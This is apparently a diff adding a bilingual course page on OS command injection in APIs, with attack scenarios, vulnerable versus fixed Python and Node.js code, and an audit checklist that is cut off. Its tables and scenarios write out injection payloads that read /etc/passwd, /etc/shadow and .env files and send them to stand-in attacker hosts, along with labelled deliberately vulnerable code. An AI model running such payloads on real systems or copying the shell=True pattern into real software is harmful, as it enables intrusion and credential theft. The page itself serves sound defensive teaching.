+    <!-- ====================================================================
+         MAIN CONTENT AREA
+         ==================================================================== -->
+    <main class="dashboard-main">
+
+      <!-- Top Action Bar -->
+      <div class="main-top-actionbar">
+        <div class="actionbar-left">
+          <a href="index.html" class="back-home-link">
+            <span>&larr;</span> <span>All Topics</span>
+          </a>
+        </div>
+        <div class="actionbar-controls">
+          <button type="button" class="btn-action-control" id="langToggleBtn" title="Toggle English / Hinglish">
+            <span>🌐</span> <span id="langBtnText">Hinglish / English</span>
+          </button>
+          <button type="button" class="btn-action-control" id="themeToggleBtn" title="Toggle Dark / Light Theme">
+            <span>🌙</span> <span id="themeBtnText">Dark Mode</span>
+          </button>
+        </div>
+      </div>
+
+      <!-- Header Hero Grid -->
+      <div class="hero-top-grid">
+        <div class="hero-text-col">
+          <div class="category-tag-row">
+            <span class="pill-index-tag">MODULE 10</span>
+            <span class="pill-category-name">OWASP API8:2023 &bull; INJECTION (CWE-78)</span>
+          </div>
+
+          <h1 class="main-vuln-h1">
+            OS Command<br>
+            <span class="title-green">Injection (RCE)</span>
+          </h1>
+
+          <p class="main-vuln-desc">
+            <span class="lang-hi">OS Command Injection tab hota hai jab backend API kisi user-controlled parameter (IP address, filename, domain, format) ko bina strict sanitization ke operating system shell (<code>bash</code>, <code>sh</code>, <code>cmd.exe</code>) me pass kar deti hai, jisse attacker shell separators (<code>;</code>, <code>&&</code>, <code>|</code>, <code>$()</code>) ke zariye arbitrary system commands execute karke poore server ka root/admin access le leta hai.</span>
+            <span class="lang-en">OS Command Injection occurs when an API endpoint incorporates untrusted user data into operating system shell command strings without rigorous escaping or parameterized execution, permitting attackers to inject shell meta-characters (;, &&, |, $()) to execute arbitrary system binaries and achieve full Remote Code Execution (RCE).</span>
+          </p>
+
+          <!-- Meta tags row -->
+          <div class="meta-tags-row">
+            <span class="meta-chip danger">
+              <span class="badge-dot" style="background:#ef4444; width:6px; height:6px; border-radius:50%;"></span> Critical Remote Code Execution (CVSS 9.8)
+            </span>
+            <span class="meta-chip info">
+              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/></svg>
+              CWE-78 / OWASP API8:2023
+            </span>
+            <span class="meta-chip purple">
+              ★ Shell Subprocess & System Execution
+            </span>
+          </div>
+
+          <!-- Highlight Insight Quote Bubble -->
+          <div class="quote-bubble">
+            <div class="quote-icon-box">💡</div>
+            <div>
+              <span class="lang-hi"><strong>Rohan's Architecture Rule:</strong> "Developer ko lagta hai usne system command ko hide kar diya hai, par shell interpreter string concatenate hote hi har semicolon ko naya command maanta hai! Kabhi bhi <code>shell=True</code> ya <code>child_process.exec()</code> me user input string format na karein."</span>
+              <span class="lang-en"><strong>Rohan's Architecture Rule:</strong> "Developers assume underlying CLI commands are invisible, but shell interpreters parse every semicolon as a distinct statement delimiter! Never pass formatted user strings into <code>shell=True</code> or <code>child_process.exec()</code>."</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Right Box (Interactive Hero Widget) -->
+        <div class="hero-glass-graphic" id="cmdHeroWidget">
+          <div class="hero-widget-header">
+            <div class="hero-widget-badge">
+              <span class="pulse-live-dot"></span>
+              <span class="hero-badge-title">Interactive Command Injection Simulator</span>
+            </div>
+            <div class="hero-sim-pills">
+              <button type="button" class="hero-sim-btn" id="btnCmdSafe" title="Protected: Parameterized execFile Without Shell">
+                <span>🛡️</span> <span>No Shell (Safe)</span>
+              </button>
+              <button type="button" class="hero-sim-btn active exploit" id="btnCmdExploit" title="Vulnerable: Raw String Concatenation in sh -c">
+                <span>⚠️</span> <span>Shell Exec (Exploit)</span>
+              </button>
+            </div>
+          </div>
+
+          <div class="hero-widget-body">
+            <div class="attacker-graphic-node">
+              <div class="attacker-avatar-circle">🥷</div>
+              <div class="attacker-label">Rohan (Red Teamer)</div>
+              <div class="attacker-sub">host: "8.8.8.8; whoami"</div>
+            </div>
+
+            <div class="graphic-center-flow">
+              <div class="graphic-url-pill" id="heroUrlPill">
+                <span style="color:#ef4444; font-weight:700;">POST</span> <span>/api/v1/diagnostics/ping</span>
+              </div>
+              <div class="graphic-beam-track">
+                <div class="graphic-beam-particle" id="heroBeamParticle"></div>
+              </div>
+              <div class="graphic-flow-state" id="heroFlowState" style="color:#ef4444;">
+                Semicolon Chaining Active
+              </div>
+            </div>
+
+            <div class="target-profile-card exploit" id="heroTargetCard">
+              <div class="target-header-row">
+                <span style="font-weight:700; color:#fff;" id="heroTargetName">Linux App Container</span>
+                <span class="target-pill-status breach" id="heroTargetStatus">RCE COMPROMISED</span>
+              </div>
+              <div class="target-data-line" id="heroField1" style="color:#ef4444;">sh -c "ping -c 2 8.8.8.8; whoami"</div>
+              <div class="target-data-line" id="heroField2" style="color:#ef4444;">Output: root (uid=0 gid=0)</div>
+              <div class="target-data-line" id="heroField3" style="color:#ef4444;">Full Container Host Takeover</div>
+              <div class="target-data-line" id="heroTargetNote" style="color:#f87171; font-weight:700;">🚨 Reverse Shell Ready!</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Tab Navigation Bar -->
+      <div class="tab-underline-bar">
+        <button type="button" class="tab-underline-btn active" data-tab="tab-overview">📖 1. Overview</button>
+        <button type="button" class="tab-underline-btn" data-tab="tab-how-it-works">⚙️ 2. How It Works</button>
+        <button type="button" class="tab-underline-btn" data-tab="tab-scenarios">🎯 3. Attack Scenarios</button>
+        <button type="button" class="tab-underline-btn" data-tab="tab-code">💻 4. Code & Fix</button>
+        <button type="button" class="tab-underline-btn" data-tab="tab-checklist">📋 5. Review Checklist</button>
+        <button type="button" class="tab-underline-btn" data-tab="tab-lab">⚡ 6. Live Lab</button>
+        <button type="button" class="tab-underline-btn" data-tab="tab-questions">❓ 7. FAQ</button>
+      </div>
+
+      <!-- ==================================================================
+           TAB 1: OVERVIEW
+           ================================================================== -->
+      <div class="tab-content active" id="tab-overview">
+        <div class="panel-card">
+          <h3>
+            <span>📖</span>
+            <span class="lang-hi">Command Injection Kya Hai?</span>
+            <span class="lang-en">What is Command Injection in Modern APIs?</span>
+          </h3>
+
+          <p>
+            <span class="lang-hi">OS Command Injection (CWE-78) tab hota hai jab application layer operating system ke native shell commands execute karne ke liye user ke dwara diye gaye inputs ko direct string concatenation ke zariye shell interpreter (jaise <code>/bin/sh</code>, <code>/bin/bash</code>, ya Windows <code>cmd.exe</code>) ko pass kar deti hai. Attacker shell metacharacters jaise <code>;</code>, <code>&&</code>, <code>||</code>, <code>|</code>, ya <code>`command`</code> inject karke original command ke baad apne manchahe system commands execute karwa deta hai.</span>
+            <span class="lang-en">OS Command Injection (CWE-78) occurs when an application constructs operating system shell commands using unvalidated, untrusted user inputs and submits them directly to a system shell interpreter (such as <code>/bin/sh</code>, <code>/bin/bash</code>, or Windows <code>cmd.exe</code>). Attackers utilize shell metacharacters such as <code>;</code>, <code>&&</code>, <code>||</code>, <code>|</code>, or <code>`command`</code> to chain arbitrary commands directly onto the host operating system.</span>
+          </p>
+
+          <h4>
+            <span class="lang-hi">Modern APIs Me Command Execution Kaha Hoti Hai?</span>
+            <span class="lang-en">Where Does Command Execution Occur in Modern APIs?</span>
+          </h4>
+          <p>
+            <span class="lang-hi">Bahut se developers sochte hain ki modern microservices sirf pure JSON aur database queries use karti hain, isliye command injection purani baat ho chuki hai. Lekin real-world production systems me kai common use-cases me system binaries invoke hoti hain:</span>
+            <span class="lang-en">Many engineers mistakenly believe modern microservices interact solely via clean JSON and ORMs, assuming command injection is obsolete. In enterprise production environments, APIs regularly spawn background CLI processes for specialized operations:</span>
+          </p>
+
+          <ul style="padding-left: 1.4rem; line-height: 1.8; color: #cbd5e1;">
+            <li><strong>Network Diagnostics Endpoints:</strong> Ping utilities, traceroute, DNS lookups (<code>ping</code>, <code>nslookup</code>, <code>traceroute</code>, <code>dig</code>) in cloud monitoring or telecom dashboards.</li>
+            <li><strong>Document & Report Generation:</strong> Converting HTML/Markdown to PDF via CLI wrappers like <code>wkhtmltopdf</code>, <code>pandoc</code>, ya <code>libreoffice --headless</code>.</li>
+            <li><strong>Media Transcoding & Compression:</strong> Audio/video processing APIs executing <code>ffmpeg</code>, <code>ffprobe</code>, <code>sox</code>, ya image manipulation with <code>convert / ImageMagick</code>.</li>
+            <li><strong>Archive & Cloud Backup Automation:</strong> Packaging user logs or exports using <code>tar -czf</code>, <code>zip</code>, <code>pg_dump</code>, ya <code>rclone</code>.</li>
+            <li><strong>Git & CI/CD Webhooks:</strong> Auto-deploy scripts triggering <code>git clone</code>, <code>kubectl apply</code>, ya <code>helm upgrade</code> based on webhook payload attributes.</li>
+          </ul>
+
+          <div style="margin-top: 1.4rem; padding: 1.2rem 1.4rem; background: rgba(239, 68, 68, 0.08); border-left: 4px solid #ef4444; border-radius: 4px;">
+            <div style="font-weight: 700; color: #f87171; font-size: 0.95rem; margin-bottom: 4px;">
+              ⚠️ Maximum Impact: Full Remote Code Execution (RCE)
+            </div>
+            <p style="margin: 0; font-size: 0.88rem; color: #cbd5e1;">
+              <span class="lang-hi">Command Injection direct server compromise create karta hai. Attacker environment variables (AWS keys, database passwords, JWT secrets) chura sakta hai, reverse shell se server par interactive access le sakta hai, internal network me lateral movement kar sakta hai, ya data tamper karke ransomware deploy kar sakta hai.</span>
+              <span class="lang-en">Command Injection triggers immediate host infrastructure compromise. Adversaries can dump environment secrets (cloud IAM keys, database credentials, token secrets), establish persistent reverse shells, pivot across internal subnets, or deploy ransomware payloads directly onto container nodes.</span>
+            </p>
+          </div>
+        </div>
+      </div>
+
+      <!-- ==================================================================
+           TAB 2: HOW IT WORKS
+           ================================================================== -->
+      <div class="tab-content" id="tab-how-it-works">
+        <div class="panel-card">
+          <h3>
+            <span>⚙️</span>
+            <span class="lang-hi">Command Injection Ki Mechanics</span>
+            <span class="lang-en">Anatomy & Shell Evaluation Mechanics</span>
+          </h3>
+
+          <p>
+            <span class="lang-hi">Jab Python me <code>subprocess.Popen("ping -c 1 " + host, shell=True)</code> ya Node.js me <code>child_process.exec("ping -c 1 " + host)</code> likha jata hai, toh operating system ek actual shell process spawn karta hai (<code>/bin/sh -c "..."</code>). Shell interpreter pure string ko analyze karta hai aur operators ke milte hi command execution stream ko split kar deta hai.</span>
+            <span class="lang-en">When developers invoke <code>subprocess.Popen("ping -c 1 " + host, shell=True)</code> in Python or <code>child_process.exec("ping -c 1 " + host)</code> in Node.js, the operating system launches a system shell wrapper (<code>/bin/sh -c "..."</code>). The shell parses command line tokens and splits execution control upon encountering command delimiters.</span>
+          </p>
+
+          <h4>
+            <span class="lang-hi">Shell Metacharacters & Delimiters Matrix</span>
+            <span class="lang-en">Shell Metacharacters & Operator Table</span>
+          </h4>
+
+          <div style="overflow-x: auto; margin-top: 1rem;">
+            <table style="width: 100%; border-collapse: collapse; font-size: 0.88rem; text-align: left;">
+              <thead>
+                <tr style="border-bottom: 1px solid rgba(255,255,255,0.15); background: rgba(255,255,255,0.02); color: #4ade80;">
+                  <th style="padding: 10px 14px;">Operator</th>
+                  <th style="padding: 10px 14px;">Behavior / Syntax</th>
+                  <th style="padding: 10px 14px;">Exploit Example</th>
+                  <th style="padding: 10px 14px;">Shell Context</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr style="border-bottom: 1px solid rgba(255,255,255,0.06);">
+                  <td style="padding: 10px 14px; font-family: var(--font-mono); color: #f87171; font-weight:700;">;</td>
+                  <td style="padding: 10px 14px;">Sequential execution (first finishes, next runs regardless of status)</td>
+                  <td style="padding: 10px 14px; font-family: var(--font-mono); color: #e2e8f0;">8.8.8.8 ; id</td>
+                  <td style="padding: 10px 14px; color: #94a3b8;">Unix / Linux</td>
+                </tr>
+                <tr style="border-bottom: 1px solid rgba(255,255,255,0.06);">
+                  <td style="padding: 10px 14px; font-family: var(--font-mono); color: #f87171; font-weight:700;">&&</td>
+                  <td style="padding: 10px 14px;">Logical AND (second command runs only if first succeeds)</td>
+                  <td style="padding: 10px 14px; font-family: var(--font-mono); color: #e2e8f0;">127.0.0.1 && whoami</td>
+                  <td style="padding: 10px 14px; color: #94a3b8;">Unix & Windows</td>
+                </tr>
+                <tr style="border-bottom: 1px solid rgba(255,255,255,0.06);">
+                  <td style="padding: 10px 14px; font-family: var(--font-mono); color: #f87171; font-weight:700;">||</td>
+                  <td style="padding: 10px 14px;">Logical OR (second command runs if first fails)</td>
+                  <td style="padding: 10px 14px; font-family: var(--font-mono); color: #e2e8f0;">invalid-host || cat /etc/passwd</td>
+                  <td style="padding: 10px 14px; color: #94a3b8;">Unix & Windows</td>
+                </tr>
+                <tr style="border-bottom: 1px solid rgba(255,255,255,0.06);">
+                  <td style="padding: 10px 14px; font-family: var(--font-mono); color: #f87171; font-weight:700;">|</td>
+                  <td style="padding: 10px 14px;">Pipes stdout of first command into stdin of second</td>
+                  <td style="padding: 10px 14px; font-family: var(--font-mono); color: #e2e8f0;">8.8.8.8 | uname -a</td>
+                  <td style="padding: 10px 14px; color: #94a3b8;">Unix & Windows</td>
+                </tr>
+                <tr style="border-bottom: 1px solid rgba(255,255,255,0.06);">
+                  <td style="padding: 10px 14px; font-family: var(--font-mono); color: #f87171; font-weight:700;">`cmd` or $(cmd)</td>
+                  <td style="padding: 10px 14px;">Command substitution (evaluates inner command first and places result in-line)</td>
+                  <td style="padding: 10px 14px; font-family: var(--font-mono); color: #e2e8f0;">$(whoami).attacker.com</td>
+                  <td style="padding: 10px 14px; color: #94a3b8;">Unix / Linux</td>
+                </tr>
+                <tr>
+                  <td style="padding: 10px 14px; font-family: var(--font-mono); color: #f87171; font-weight:700;">
+ (%0a)</td>
+                  <td style="padding: 10px 14px;">Newline terminates line and triggers execution in shell scripts</td>
+                  <td style="padding: 10px 14px; font-family: var(--font-mono); color: #e2e8f0;">8.8.8.8%0aid</td>
+                  <td style="padding: 10px 14px; color: #94a3b8;">Unix / Linux</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+
+          <h4 style="margin-top: 1.8rem;">
+            <span class="lang-hi">In-Band vs. Blind Command Injection</span>
+            <span class="lang-en">In-Band vs. Blind Command Injection</span>
+          </h4>
+          <p>
+            <span class="lang-hi"><strong>1. In-Band (Direct Output):</strong> Jab API response me command ka stdout/stderr direct return ho jata hai (jaise diagnostics logs me terminal output aana). Yaha attacker directly <code>cat /etc/passwd</code> ka content HTTP response me padh leta hai.</span>
+            <span class="lang-en"><strong>1. In-Band (Direct Output):</strong> When the API endpoint directly reflects standard output (stdout) or error streams (stderr) within the JSON response payload. The attacker observes immediate results (e.g., directory listings or system identity).</span>
+          </p>
+          <p>
+            <span class="lang-hi"><strong>2. Blind Command Injection:</strong> Jab API output suppress kar deti hai aur sirf <code>{"status": "queued"}</code> ya <code>{"success": true}</code> return karti hai. Yaha verification ke do methods hote hain:</span>
+            <span class="lang-en"><strong>2. Blind Command Injection:</strong> When the API suppresses command output, returning generic acknowledgment messages. Exploitation is confirmed through side-channel techniques:</span>
+          </p>
+          <ul style="padding-left: 1.4rem; line-height: 1.8; color: #cbd5e1;">
+            <li><strong>Time Delays:</strong> Injecting sleep primitives like <code>; sleep 10</code>. Agar API response exact 10 seconds baad aaye, toh injection confirm ho jata hai.</li>
+            <li><strong>Out-of-Band (OOB) Exfiltration:</strong> Attacker server se external callback trigger karta hai: <code>; curl -X POST -d @/etc/passwd https://attacker.com/leak</code> ya DNS lookup: <code>; ping -c 1 $(whoami).burpcollaborator.net</code>.</li>
+          </ul>
+        </div>
+      </div>
+
+      <!-- ==================================================================
+           TAB 3: ATTACK SCENARIOS
+           ================================================================== -->
+      <div class="tab-content" id="tab-scenarios">
+        <div class="panel-card">
+          <h3>
+            <span>🎯</span>
+            <span class="lang-hi">Real-World API Attack Scenarios</span>
+            <span class="lang-en">Real-World API Exploit Scenarios</span>
+          </h3>
+
+          <!-- Scenario 1 -->
+          <div class="scenario-card">
+            <div class="scenario-title">
+              <span>1. Network Diagnostics & Cloud Ping API</span>
+              <span class="scenario-badge">IN-BAND RCE</span>
+            </div>
+            <p>
+              <span class="lang-hi">Developer Vikram ne admin dashboard ke liye ek network health check API banayi jo kisi bhi target server par ping status check karti hai:</span>
+              <span class="lang-en">Developer Vikram engineered an admin diagnostics endpoint intended to test external server reachability:</span>
+            </p>
+            <div class="compare-box vuln" style="margin-bottom: 1rem;">
+              <div class="compare-header">
+                <span>Vulnerable Request Payload</span>
+                <span>POST /api/v1/diagnostics/ping</span>
+              </div>
+              <pre class="code-terminal-pre"><code>{
+  <span class="t-key">"host"</span>: <span class="t-str">"8.8.8.8; whoami; id; uname -a"</span>,
+  <span class="t-key">"count"</span>: <span class="t-num">2</span>
+}</code></pre>
+            </div>
+            <p>
+              <span class="lang-hi">Backend code <code>os.system(f"ping -c 2 {host}")</code> execute karta hai. Semicolon milte hi ping ke baad <code>whoami</code> aur <code>uname -a</code> execute hote hain aur application container ka root privilege leak ho jata hai.</span>
+              <span class="lang-en">The backend formats the parameter into a shell string. The shell executes the initial ping, followed immediately by whoami and uname, granting the attacker instant execution visibility.</span>
+            </p>
+          </div>
+
+          <!-- Scenario 2 -->
+          <div class="scenario-card">
+            <div class="scenario-title">
+              <span>2. PDF Report Generator via CLI Wrapper</span>
+              <span class="scenario-badge">FLAG INJECTION & SUB-SHELL</span>
+            </div>
+            <p>
+              <span class="lang-hi">API user ke invoices export karne ke liye <code>wkhtmltopdf</code> binary invoke karti hai:</span>
+              <span class="lang-en">An invoicing microservice invokes wkhtmltopdf to generate downloadable billing statements:</span>
+            </p>
+            <div class="compare-box vuln" style="margin-bottom: 1rem;">
+              <div class="compare-header">
+                <span>Attacker Modified Request</span>
+                <span>POST /api/v1/invoices/export</span>
+              </div>
+              <pre class="code-terminal-pre"><code>{
+  <span class="t-key">"invoiceId"</span>: <span class="t-str">"INV-1092"</span>,
+  <span class="t-key">"outputName"</span>: <span class="t-str">"report.pdf; cat /app/.env > /var/www/static/leaked.txt"</span>
+}</code></pre>
+            </div>
+            <p>
+              <span class="lang-hi">Shell concatenation ki wajah se command terminate hoti hai aur <code>.env</code> file (jisme AWS_SECRET_ACCESS_KEY aur DB_PASSWORD stored hain) public static directory me copy ho jati hai, jise attacker direct browser se download kar leta hai.</span>
+              <span class="lang-en">Due to shell evaluation, the secondary command executes, copying the production .env secrets file into a publicly served web root directory for effortless exfiltration.</span>
+            </p>
+          </div>
+
+          <!-- Scenario 3 -->
+          <div class="scenario-card">
+            <div class="scenario-title">
+              <span>3. Blind Command Injection with Out-of-Band Exfiltration</span>
+              <span class="scenario-badge">BLIND OOB EXFILTRATION</span>
+            </div>
+            <p>
+              <span class="lang-hi">API background video encoding ke liye job queue use karti hai aur response me koi terminal text nahi deti:</span>
+              <span class="lang-en">A video transcoding endpoint processes tasks asynchronously via worker queues without returning stdout:</span>
+            </p>
+            <div class="compare-box vuln" style="margin-bottom: 1rem;">
+              <div class="compare-header">
+                <span>Blind Exploit Request</span>
+                <span>POST /api/v1/media/transcode</span>
+              </div>
+              <pre class="code-terminal-pre"><code>{
+  <span class="t-key">"mediaUrl"</span>: <span class="t-str">"http://valid.site/clip.mp4"</span>,
+  <span class="t-key">"watermarkText"</span>: <span class="t-str">"Test $(curl -X POST -d @/etc/shadow https://attacker-collborator.net/leak)"</span>
+}</code></pre>
+            </div>
+            <p>
+              <span class="lang-hi">API response sirf <code>{"status": "processing"}</code> return karti hai, lekin background worker <code>$()</code> command substitution evaluate karke shadow file attacker ke server par POST kar deta hai.</span>
+              <span class="lang-en">The API responds with a generic job acknowledgment, while the background worker resolves the command substitution, transmitting the server shadow file to the external listener.</span>
+            </p>
+          </div>
+        </div>
+      </div>
+
+      <!-- ==================================================================
+           TAB 4: CODE & FIX
+           ================================================================== -->
+      <div class="tab-content" id="tab-code">
+        <div class="panel-card">
+          <h3>
+            <span>💻</span>
+            <span class="lang-hi">Vulnerable vs. Secure Code Implementations</span>
+            <span class="lang-en">Vulnerable vs. Secure Architecture Patterns</span>
+          </h3>
+
+          <!-- Python FastApi Compare -->
+          <h4 style="color: #38bdf8;">1. Python (FastAPI / Subprocess)</h4>
+          <div class="compare-container">
+            <div class="compare-box vuln">
+              <div class="compare-header">
+                <span>❌ VULNERABLE: shell=True String Formatting</span>
+                <span>Python</span>
+              </div>
+              <pre class="code-terminal-pre"><code><span class="t-kw">import</span> subprocess
+<span class="t-kw">from</span> fastapi <span class="t-kw">import</span> FastAPI, HTTPException
+
+app = FastAPI()
+
+<span class="t-kw">@app.post</span>(<span class="t-str">"/api/v1/diagnostics/ping"</span>)
+<span class="t-kw">def</span> <span class="t-fn">ping_host</span>(payload: PingRequest):
+    <span class="t-cmt"># 🚨 CRITICAL FLAW: shell=True interprets metacharacters!</span>
+    cmd = <span class="t-str">f"ping -c 2 {payload.host}"</span>
+    output = subprocess.<span class="t-fn">check_output</span>(cmd, <span class="t-var">shell</span>=<span class="t-bool">True</span>)
+    <span class="t-kw">return</span> {<span class="t-key">"result"</span>: output.<span class="t-fn">decode</span>()}</code></pre>
+            </div>
+
+            <div class="compare-box safe">
+              <div class="compare-header">
+                <span>✅ SECURE: shell=False + Argument Array + Regex</span>
+                <span>Python</span>
+              </div>
+              <pre class="code-terminal-pre"><code><span class="t-kw">import</span> subprocess
+<span class="t-kw">import</span> re
+<span class="t-kw">from</span> ipaddress <span class="t-kw">import</span> ip_address
+
+<span class="t-kw">@app.post</span>(<span class="t-str">"/api/v1/diagnostics/ping"</span>)
+<span class="t-kw">def</span> <span class="t-fn">ping_host</span>(payload: PingRequest):
+    <span class="t-cmt"># 1. Strict Allowlist Validation (IP only)</span>
+    <span class="t-kw">try</span>:
+        ip_address(payload.host)
+    <span class="t-kw">except</span> ValueError:
+        <span class="t-kw">raise</span> HTTPException(status_code=400, detail=<span class="t-str">"Invalid IP address format"</span>)
+
+    <span class="t-cmt"># 2. shell=False (Default): OS treats every element as pure argument</span>
+    result = subprocess.<span class="t-fn">run</span>(
+        [<span class="t-str">"ping"</span>, <span class="t-str">"-c"</span>, <span class="t-str">"2"</span>, payload.host],
+        <span class="t-var">shell</span>=<span class="t-bool">False</span>,
+        <span class="t-var">capture_output</span>=<span class="t-bool">True</span>,
+        <span class="t-var">text</span>=<span class="t-bool">True</span>,
+        <span class="t-var">timeout</span>=<span class="t-num">5</span>
+    )
+    <span class="t-kw">return</span> {<span class="t-key">"result"</span>: result.stdout}</code></pre>
+            </div>
+          </div>
+
+          <!-- Node.js Compare -->
+          <h4 style="color: #38bdf8; margin-top: 2rem;">2. Node.js (Express / Child Process)</h4>
+          <div class="compare-container">
+            <div class="compare-box vuln">
+              <div class="compare-header">
+                <span>❌ VULNERABLE: exec() String Execution</span>
+                <span>JavaScript / Node.js</span>
+              </div>
+              <pre class="code-terminal-pre"><code><span class="t-kw">const</span> { exec } = <span class="t-fn">require</span>(<span class="t-str">'child_process'</span>);
+
+app.<span class="t-fn">post</span>(<span class="t-str">'/api/v1/diagnostics/ping'</span>, (req, res) => {
+  <span class="t-cmt">// 🚨 Flaw: exec spawns /bin/sh which evaluates operators!</span>
+  <span class="t-kw">const</span> cmd = <span class="t-str">`ping -c 2 ${req.body.host}`</span>;
+  <span class="t-fn">exec</span>(cmd, (err, stdout, stderr) => {
+    res.<span class="t-fn">json</span>({ output: stdout });
+  });
+});</code></pre>
+            </div>
+
+            <div class="compare-box safe">
+              <div class="compare-header">
+                <span>✅ SECURE: execFile() Without Shell Evaluation</span>
+                <span>JavaScript / Node.js</span>
+              </div>
+              <pre class="code-terminal-pre"><code><span class="t-kw">const</span> { execFile } = <span class="t-fn">require</span>(<span class="t-str">'child_process'</span>);
+<span class="t-kw">const</span> validator = <span class="t-fn">require</span>(<span class="t-str">'validator'</span>);
+
+app.<span class="t-fn">post</span>(<span class="t-str">'/api/v1/diagnostics/ping'</span>, (req, res) => {
+  <span class="t-cmt">// 1. Validate strictly</span>
+  <span class="t-kw">if</span> (!validator.<span class="t-fn">isIP</span>(req.body.host)) {
+    <span class="t-kw">return</span> res.<span class="t-fn">status</span>(<span class="t-num">400</span>).<span class="t-fn">json</span>({ error: <span class="t-str">'Valid IP required'</span> });
+  }
+
+  <span class="t-cmt">// 2. execFile does NOT launch shell interpreter by default</span>
+  <span class="t-fn">execFile</span>(<span class="t-str">'ping'</span>, [<span class="t-str">'-c'</span>, <span class="t-str">'2'</span>, req.body.host], { timeout: <span class="t-num">5000</span> }, (err, stdout) => {
+    res.<span class="t-fn">json</span>({ output: stdout });
+  });
+});</code></pre>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ==================================================================
+           TAB 5: REVIEW CHECKLIST
+           ================================================================== -->
+      <div class="tab-content" id="tab-checklist">
+        <div class="panel-card">
+          <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1.2rem; flex-wrap: wrap; gap: 10px;">
+            <h3 style="margin: 0;">
+              <span>📋</span>
+              <span class="lang-hi">Command Injection Audit & Review Checklist</span>
+              <span class="lang-en">Command Injection Prevention Checklist</span>
+            </h3>
+            <div id="checklist-progress-counter" style="font-family: var(--font-mono); font-size: 0.85rem; background: rgba(0,0,0,0.4); padding: 4px 12px; border-radius: var(--radius-pill); border: 1px solid rgba(255,255,255,0.1);">
+              0 of 8 Checks Audited
+            </div>
+          </div>
+
+          <div class="checklist-container">
+            <!-- Check 1 -->
+            <div class="checklist-item" id="check-item-1" onclick="handleCheckItemClick(event, this)">
+              <div class="check-mark-icon" onclick="toggleCheckCircle(event, this)">1</div>
+              <div class="check-content">
+                <h5>Avoid Shell Execution: Enforce shell=False / execFile()</h5>
+                <p>Ensure native subprocess APIs are called with an argument list rather than a single concatenated string through a shell interpreter.</p>
+                <div class="check-how-to-box">
+                  <strong>Verification Tip:</strong> Search codebase for <code>shell=True</code>, <code>os.system(</code>, <code>os.popen(</code>, <code>child_process.exec(</code>, <code>Runtime.getRuntime().exec(</code>.
+                </div>
+                <div class="check-actions-bar">
+                  <button type="button" class="check-status-btn pass-btn" onclick="setChecklistStatus(event, this, 'pass')">✓ Pass</button>
+                  <button type="button" class="check-status-btn fail-btn" onclick="setChecklistStatus(event, this, 'fail')">✕ Fail</button>
+                </div>
+              </div>
+            </div>
+
+            <!-- Check 2 -->
+            <div class="checklist-item" id="check-item-2" onclick="handleCheckItemClick(event, this)">
+              <div class="check-mark-icon" onclick="toggleCheckCircle(event, this)">2</div>
+              <div class="check-content">
+                <h5>Strict Positive Allowlisting for CLI Arguments</h5>
+                <p>Never rely on blacklisting operators like <code>;</code> or <code>|</code>. Enforce strict character allowlists (e.g. <code>^[a-zA-Z0-9._-]+$</code>).</p>
+                <div class="check-how-to-box">
+                  <strong>Verification Tip:</strong> Verify schema validators (Pydantic / Zod) reject spaces, backticks, newlines, and shell punctuation before execution.
+                </div>
+                <div class="check-actions-bar">
+                  <button type="button" class="check-status-btn pass-btn" onclick="setChecklistStatus(event, this, 'pass')">✓ Pass</button>
+                  <button type="button" class="check-status-btn fail-btn" onclick="setChecklistStatus(event, this, 'fail')">✕ Fail</button>
+                </div>
+              </div>
+            </div>
+
+            <!-- Check 3 -->
+            <div class="checklist-item" id="check-item-3" onclick="handleCheckItemClick(event, this)">
+              <div class="check-mark-icon" onclick="toggleCheckCircle(event, this)">3</div>
+              <div class="check-content">
+                <h5>Prefer Native Language Libraries Over External Binaries</h5>
+                <p>Replace system CLI calls with in-process SDKs (e.g. use Python <code>ping3</code> instead of <code>/bin/ping</code>, <code>sharp</code> instead of <code>convert</code>).</p>
+                <div class="check-how-to-box">
+                  <strong>Verification Tip:</strong> Audit dependencies to eliminate direct reliance on host operating system binaries.
+                </div>
+                <div class="check-actions-bar">
+                  <button type="button" class="check-status-btn pass-btn" onclick="setChecklistStatus(event, this, 'pass')">✓ Pass</button>
+                  <button type="button" class="check-status-btn fail-btn" onclick="setChecklistStatus(event, this, 'fail')">✕ Fail</button>
+                </div>
+              </div>
+            </div>
+
+            <!-- Check 4 -->
+            <div class="checklist-item" id="check-item-4" onclick="handleCheckItemClick(event, this)">
+              <div class="check-mark-icon" onclick="toggleCheckCircle(event, this)">4</div>
+              <div class="check-content">
+                <h5>Least Privilege Execution (Non-Root Containers)</h5>
+                <p>Run API processes inside containers under an unprivileged user (<code>USER node</code> or <code>USER appuser</code>), never <code>root</code>.</p>
+                <div class="check-how-to-box">
+                  <strong>Verification Tip:</strong> Check <code>Dockerfile</code> for explicit non-root user declaration and read-only root filesystems (<code>readOnlyRootFilesystem: true</code>).
+                </div>
+                <div class="check-actions-bar">
+                  <button type="button" class="check-status-btn pass-btn" onclick="setChecklistStatus(event, this, 'pass')">✓ Pass</button>
+                  <button type="button" class="check-status-btn fail-btn" onclick="setChecklistStatus(event, this, 'fail')">✕ Fail</button>
+                </div>
+              </div>
+            </div>
+
+            <!-- Check 5 -->
+            <div class="checklist-item" id="check-item-5" onclick="handleCheckItemClick(event, this)">
+              <div class="check-mark-icon" onclick="toggleCheckCircle(event, this)">5</div>
+              <div class="check-content">
+                <h5>Process Timeout & Resource Constraints</h5>
+                <p>Mandate explicit timeouts on any spawned child processes to prevent catastrophic denial of service via long-running sleep commands.</p>
+                <div class="check-how-to-box">
+                  <strong>Verification Tip:</strong> Ensure <code>timeout=5</code> is specified in all subprocess configurations.
+                </div>
+                <div class="check-actions-bar">
+                  <button type="button" class="check-status-btn pass-btn" onclick="setChecklistStatus(event, this, 'pass')">✓ Pass</button>
+                  <button type="button" class="check-status-btn fail-btn" onclick="setChecklistStatus(event, this, 'fail')">✕ Fail</button>
+                </div>
+              </div>
+            </div>
+
+            <!-- Check 6 -->
+            <div class="checklist-item" id="check-item-6" onclick="handleCheckItemClick(event, this)">
+              <div class="check-mark-icon" onclick="toggleCheckCircle(event, this)">6</div>
